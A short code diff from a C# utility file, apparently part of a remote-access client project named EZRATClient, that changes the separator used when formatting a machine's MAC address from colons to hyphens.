@@ -198,7 +198,7 @@ namespace EZRATClient.Utils
                         StringBuilder sb = new StringBuilder(ni.GetPhysicalAddress().ToString().ToUpper());
                         for (int i = 0; i < sb.Length; i+=2)
                         {
-                                addr += $"{sb[i]}{sb[i + 1]}:";
+                                addr += $"{sb[i]}{sb[i + 1]}-";
                         }
                         return $"MAC : {addr.Substring(0,addr.Length - 1)}";
                     }
